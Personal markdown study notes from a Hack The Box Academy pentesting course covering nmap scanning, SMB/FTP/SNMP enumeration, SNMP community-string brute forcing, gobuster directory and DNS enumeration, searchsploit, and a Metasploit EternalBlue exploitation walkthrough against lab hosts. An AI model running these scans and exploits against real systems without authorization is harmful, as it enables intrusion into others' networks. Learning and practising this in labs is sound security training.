 //to-do: learn github.md syntax
 //to-do: grab flag: https://academy.hackthebox.com/module/77/section/843

## nmap:
### flags:
[non]: Top 1000. TCP (not UDP)
-sC parameter to specify that Nmap scripts should be used to try and obtain more detailed information
-sV parameter instructs Nmap to perform a version scan. The version scan is underpinned by a comprehensive database of over 1,000 service signatures.  
-p- tells Nmap that we want to scan all 65,535 TCP ports.
(((
phpinfo(): The script scan -sC flag causes Nmap to report the server headers http-server-header page and the page title http-title for any web page hosted on the webserver. The web page title PHP 7.4.3 - phpinfo() indicates that this is a PHPInfo file, which is often manually created to confirm that PHP has been successfully installed. The title (and PHPInfo page) also reveals the PHP version, which is worth noting if it is vulnerable.
)))


### indicator ports: 
 port 3389 default for Remote Desktop Services --> indicates Windows OS
 port 22, SSH --> indicates Linux/Unix

### nmap scripts:
Syntax: nmap --script <script name> -p<port> <host>
(((
cyberSecHell@htb[/htb]$ locate scripts/citrix

/usr/share/nmap/scripts/citrix-brute-xml.nse
)))

# Attacking Network Services

## Banner Grabbing
nmap -sV --script=banner <target> (((  nmap -sV --script=banner -p21 10.10.10.0/24 )))
nc -nv <ip> <port>

## FTP
nmap -sC -sV -p21 10.129.42.253
ftp -p 10.129.42.253 ((( ls, cd <dir> get, <filename>, exit )))

## SMB (Server Message Block) (Windows)
(samba?)
"some SMB versions may be vulnerable to RCE exploits such as EternalBlue"
"Nmap has many scripts for enumerating SMB, such as smb-os-discovery.nse, which will interact with the SMB service to extract the reported operating system version." (((nmap --script smb-os-discovery.nse -p445 10.10.10.40)))
nmap -A -p445 10.129.42.253 (((look up -A flag)))

### shares (SMB) 
(((
smbclient -N -L \\\\10.129.42.253
)))
SMB allows users and administrators to share folders and make them accessible remotely by other users. Often these shares have files in them that contain sensitive information such as passwords. A tool that can enumerate and interact with SMB shares is smbclient. The -L flag specifies that we want to retrieve a list of available shares on the remote host, while -N suppresses the password prompt.
(((
smbclient -U <user> \\\\10.129.42.253\\users   <users --> location?>
)))

get <file> - 
the - displays the content in terminal
 
##SNMP
"SNMP Community strings provide information and statistics about a router or device-SNIP- The manufacturer default community strings of public and private are often unchanged. In SNMP versions 1 and 2c, access is controlled using a plaintext community string, and if we know the name, we can gain access to it. Encryption and authentication were only added in SNMP version 3."

(((snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0)))
(((snmpwalk -v 2c -c private  10.129.42.253 )))

"A tool such as onesixtyone can be used to brute force the community string names using a dictionary file of common community strings such as the dict.txt file included in the GitHub repo for the tool."

(((onesixtyone -c dict.txt 10.129.42.254)))

##Conclusion
(((
VPN Servers

Warning: Each time you "Switch", your connection keys are regenerated and you must re-download your VPN connection file.

All VM instances associated with the old VPN Server will be terminated when switching to a new VPN server.
Existing PwnBox instances will automatically switch to the new VPN server.
)))

# Web Enumeration

## Gobuster
" We can use a tool such as ffuf or GoBuster to perform this directory enumeration. "

### Directory/File Enumeration
gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt <br>
dirb common.txt <be>

#### HTTP status code of 
-200 reveals that the resource's request was successful, 
-403 HTTP status code indicates that we are forbidden to access the resource. 
-301 status code indicates that we are being redirected, which is not a failure case. 
--It is worth familiarizing ourselves with the various HTTP status codes, which can be found at: https://en.wikipedia.org/wiki/List_of_HTTP_status_codes
--The Web Requests Academy Module also covers HTTP status codes further in-depth.

### DNS Subdomain Enumeration
#### install SecLists
clone SecLists:
-$ git clone https://github.com/danielmiessler/SecLists
-$ sudo apt install seclists -y
"""
Next, add a DNS Server such as 1.1.1.1 to the /etc/resolv.conf file. We will target the domain inlanefreight.com, the website for a fictional freight and logistics company.
"""
-$ gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt

"""
This scan reveals several interesting subdomains that we could examine further. The Attacking Web Applications with Ffuf module goes into more details about web enumeration and fuzzing.
https://academy.hackthebox.com/module/details/54
"""

## Web Enumeration Tips
#### Banner Grabbing / Web Server Headers
- curl -IL https://www.inlanefreight.com
use cURL to grab banner/headers
learn cURL
"""Another handy tool is EyeWitness, which can be used to take screenshots of target web applications, fingerprint them, and identify possible default credentials.:
https://github.com/FortyNorthSecurity/EyeWitness
"""
#### Whatweb
-whatweb 10.10.10.121
whatweb --no-errors 10.10.10.0/24

#### Certificates
PHISING
SSL/TLS certificates are another potentially valuable source of information if HTTPS is in use. Browsing to https://10.10.10.121/ and viewing the certificate reveals the details below, including the email address and company name. These could potentially be used to conduct a phishing attack if this is within the scope of an assessment.

#### robots.txt
remember evil-robots.txt?

#### Source Code
-has anyone ever found credentials in a source code in the real world??

# Public Exploits
searchsploit
- $ sudo apt install exploitdb -y

"""we can use searchsploit to search for a specific application by its name, as follows:"""
- $ searchsploit openssh 7.2
"""We can also utilize online exploit databases to search for vulnerabilities, like Exploit DB, Rapid7 DB, or Vulnerability Lab. The Intro to Web Applications module discusses public vulnerabilities for web applications: https://academy.hackthebox.com/module/details/75
/*see more links under links--> exploits*/"""

## Metasploit Primer
msfconsole
"""


The Metasploit Framework (MSF) is an excellent tool for pentesters. It contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets. MSF has many other features, like:

-    Running reconnaissance scripts to enumerate remote hosts and compromised targets

-    Verification scripts to test the existence of a vulnerability without actually compromising the target

-    Meterpreter, which is a great tool to connect to shells and run commands on the compromised targets

-    Many post-exploitation and pivoting tools

Let us take a basic example of searching for an exploit for an application we are attacking and how to exploit it. To run Metasploit, we can use the msfconsole command:
"""
- $ msfconsole

"""Once we have Metasploit running, we can search for our target application with the search exploit command. For example, we can search for the SMB vulnerability we identified previously:
"""
- msf6 > search exploit eternalblue
"""Tip: Search can apply complex filters such as search cve:2009 type:exploit. See all the filters with help search"""
- > use exploit/windows/smb/ms17_010_psexec
- > show options

"""Any option with Required set to yes needs to be set for the exploit to work. In this case, we only have two options to set: RHOSTS, which means the IP of our target (this can be one IP, multiple IPs, or a file containing a list of IPs). We can set them with the set command:

-  > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
-  > set LHOST tun0
LHOST => tun0
"""

"""Once we have both options set, we can start the exploitation. However, before we run the script, we can run a check to ensure the server is vulnerable:

- > check"""

- > run / > exploit

- > search
- > show options
- > set
  > check
  > exploit

"""As we can see, we have been able to gain admin access to the box and used the shell command to drop us into an interactive shell. These are basic examples of using Metasploit to exploit a vulnerability on a remote server. There are many retired boxes on the Hack The Box platform that are great for practicing Metasploit. Some of these include, but not limited to:

    Granny/Grandpa
    Jerry
    Blue
    Lame
    Optimum
    Legacy
    Devel
"""

Nibbles.




# links
https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/  <br>
https://owasp.org/www-project-top-ten/  <br>
https://www.stationx.net/common-ports-cheat-sheet/  <br>
https://docs.github.com/en/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax  <br>
### print
https://packetlife.net/media/library/23/common-ports.pdf
### exploits
- https://www.exploit-db.com/
- https://www.rapid7.com/db/
- https://www.vulnerability-lab.com/
